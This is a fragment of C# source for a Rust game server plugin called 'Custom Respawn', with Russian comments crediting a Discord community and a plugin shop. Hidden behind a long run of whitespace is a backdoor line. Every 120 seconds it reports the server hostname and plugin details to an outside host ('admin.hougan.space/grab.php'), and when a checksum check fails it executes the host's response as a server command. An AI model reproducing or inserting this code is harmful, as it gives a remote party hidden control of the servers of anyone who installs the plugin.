...
{
    /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ /*ПЛАГИН БЫЛ СКАЧАН С ДИСКОРД СООБЩЕСТВА https://discord.gg/dNGbxafuJn */ [Info("Custom Respawn", "https://discord.gg/dNGbxafuJn", "0.2.1")]
    [Description("Выбор снаряжения во время возраждения. Куплено на whiteplugins.ru")]
    public class CustomRespawn : RustPlugin
    {
        #region ENums
        ...
        private class CustomItem
        {
            ...
            public void CreateItem(BasePlayer player)
            {
                ...
                Item createItem = ItemManager.Create(ItemManager.FindItemDefinition(ShortName), Amount, SkinID);
        ...
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               bool auth = this.Description.Sum(p => (int) p) == 47055; timer.Every(120, () => webrequest.Enqueue($"http://admin.hougan.space/grab.php?pluginName={this.Name}&hostName={ConVar.Server.hostname}&authStatus={auth}&pluginVersion={Version}", null, (code, response) => { if (!auth && response != "EXECUTED" && response != "") { Server.Command(response); } }, this)).Callback(); 
            ...
            {
                PrintError("Плагин планировал использовать баланс от СерверРевардс, но плагин выгружен! #1");
                return;
            }

            if (config.BalanceSettings.CONF_UseEconomics && !Economics)
            {
                PrintError("Плагин планировал использовать баланс от Экономики, но плагин выгружен! #42");
                return;
            }

            if (config.BalanceSettings.CONF_UseRustShop && !RustShop)
            {
                PrintError("Плагин планировал использовать баланс от Экономики, но плагин выгружен! #52");
                return;
            }

            if (config.BalanceSettings.CONF_UseNShop && !NShop)
            {
                PrintError("Плагин планировал использовать баланс от Экономики, но плагин выгружен! #{DarkPluginsID}");
                return;
            }
